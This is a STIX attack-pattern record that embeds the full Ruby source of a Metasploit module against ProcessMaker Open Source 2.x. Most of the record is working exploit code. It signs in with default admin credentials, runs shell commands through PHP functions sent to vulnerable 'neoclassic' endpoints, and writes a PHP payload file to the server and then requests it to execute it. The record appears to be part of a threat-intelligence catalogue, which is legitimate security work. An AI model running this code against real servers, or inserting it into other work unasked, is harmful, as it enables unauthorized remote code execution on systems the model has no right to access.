{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d524886a-c843-44d0-8b8f-877f7eebf03c",
    "created": "2024-08-14T17:08:21.263439Z",
    "modified": "2024-08-14T17:08:21.263443Z",
    "name": "\"ProcessMaker Open Source Authenticated PHP Code Execution\"",
    "description": " This module exploits a PHP code execution vulnerability in the 'neoclassic' skin for ProcessMaker Open Source which allows any authenticated user to execute PHP code. The vulnerable skin is installed by default in version 2.x and cannot be removed via the web interface.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/processmaker_exec.rb",
            "external_id": "processmaker_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://bugs.processmaker.com/view.php?id=13436"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ProcessMaker Open Source Authenticated PHP Code Execution\",\n      'Description'    => %q{\n        This module exploits a PHP code execution vulnerability in the\n        'neoclassic' skin for ProcessMaker Open Source which allows any\n        authenticated user to execute PHP code. The vulnerable skin is\n        installed by default in version 2.x and cannot be removed via\n        the web interface.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'bcoles',\n      'References'     =>\n        [\n          ['OSVDB',     '99199'],\n          ['BID',       '63411'],\n          ['URL',       'http://bugs.processmaker.com/view.php?id=13436']\n        ],\n      'Payload'        =>\n        {\n          'Space'      => 8190, # HTTP POST\n          'DisableNops'=> true,\n          'BadChars'   => \"\\x00\"\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          # Tested on:\n          # * Windows XP SP3 - ProcessMaker Open Source version 2.5.1, 2.5.0, 2.0.23\n          # * Debian Linux   - ProcessMaker Open Source version 2.0.45\n          ['ProcessMaker Open Source 2.x (PHP Payload)', { 'auto' => true }]\n        ],\n      'Privileged'     => false, # Privileged on Windows but not on *nix targets\n      'DisclosureDate' => '2013-10-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('USERNAME',  [true, 'The username for ProcessMaker', 'admin']),\n        OptString.new('PASSWORD',  [true, 'The password for ProcessMaker', 'admin']),\n        OptString.new('WORKSPACE', [true, 'The ProcessMaker workspace', 'workflow'])\n      ])\n  end\n\n  #\n  # Send command for execution\n  #\n  def execute_command(cmd, opts = { :php_function => 'system' } )\n    # random vulnerable path # confirmed in versions 2.0.23 to 2.5.1\n    vuln_url = [\n      \"/sys#{@workspace}/en/neoclassic/appFolder/appFolderAjax.php\",\n      \"/sys#{@workspace}/en/neoclassic/cases/casesStartPage_Ajax.php\",\n      \"/sys#{@workspace}/en/neoclassic/cases/cases_SchedulerGetPlugins.php\"\n    ].sample\n\n    # shuffle POST parameters\n    vars_post = Hash[{\n      'action' => opts[:php_function],\n      'params' => cmd\n    }.to_a.shuffle]\n\n    # send payload\n    vprint_status(\"Attempting to execute: #{cmd}\")\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, vuln_url),\n      'cookie'    => @cookie,\n      'vars_post' => vars_post\n    })\n    res\n  end\n\n  #\n  # Login\n  #\n  def login(user, pass)\n    # shuffle POST parameters\n    vars_post = Hash[{\n      'form[USR_USERNAME]' => Rex::Text.uri_encode(user, 'hex-normal'),\n      'form[USR_PASSWORD]' => Rex::Text.uri_encode(pass, 'hex-normal'),\n    }.to_a.shuffle]\n\n    # send login request\n    print_status(\"Authenticating as user '#{user}'\")\n    begin\n      res = send_request_cgi({\n        'method'    => 'POST',\n        'uri'       => normalize_uri(target_uri.path, \"/sys#{@workspace}/en/neoclassic/login/authentication.php\"),\n        'cookie'    => @cookie,\n        'vars_post' => vars_post\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE\n      print_error(\"Connection failed\")\n      return false\n    end\n    if res and res.code == 200 and res.body =~ /Loading styles and images/\n      print_good(\"Authenticated as user '#{user}'\")\n      return true\n    else\n      print_error(\"Authenticating as user '#{user}' failed\")\n      return false\n    end\n  end\n\n  #\n  # Check credentials are valid and confirm command execution\n  #\n  def check\n    @workspace = datastore['WORKSPACE']\n\n    # login\n    @cookie = \"PHPSESSID=#{rand_text_alphanumeric(rand(10)+10)};\"\n    unless login(datastore['USERNAME'], datastore['PASSWORD'])\n      return Exploit::CheckCode::Unknown\n    end\n\n    # send check\n    fingerprint = Rex::Text.rand_text_alphanumeric(rand(10)+10)\n    vprint_status(\"Sending check\")\n    begin\n      res = execute_command(\"echo #{fingerprint}\")\n      if res and res.body =~ /#{fingerprint}/\n        return Exploit::CheckCode::Vulnerable\n      elsif res\n        return Exploit::CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE\n      vprint_error(\"Connection failed\")\n      return Exploit::CheckCode::Unknown\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  #\n  # Write payload to filesystem\n  #\n  def upload\n    # Random PHP function for command execution\n    php_function = [\n      'exec',\n      'shell_exec',\n      'passthru',\n      'system'\n    ].sample\n\n    # upload payload\n    code = \"<?php #{payload.encoded} ?>\"\n    print_status(\"Sending payload '#{@fname}' (#{code.length} bytes)\")\n    begin\n      res = execute_command(\"echo \\\"#{code}\\\">#{@fname}\", { :php_function => php_function } )\n      if res and res.code == 200\n        print_good(\"Payload sent successfully\")\n        register_files_for_cleanup(@fname)\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Sending payload failed\")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n  end\n\n  def exploit\n    @workspace = datastore['WORKSPACE']\n\n    # login\n    @cookie = \"PHPSESSID=#{rand_text_alphanumeric(rand(10)+10)};\"\n    unless login(datastore['USERNAME'], datastore['PASSWORD'])\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed\")\n    end\n\n    # upload payload\n    @fname  = \"#{rand_text_alphanumeric(rand(10)+10)}.php\"\n    upload\n\n    # execute payload\n    print_status(\"Retrieving file '#{@fname}'\")\n    send_request_cgi({'uri' => normalize_uri(target_uri.path, \"#{@fname}\")})\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-24",
    "x_mitre_platforms": [
        "php'"
    ]
}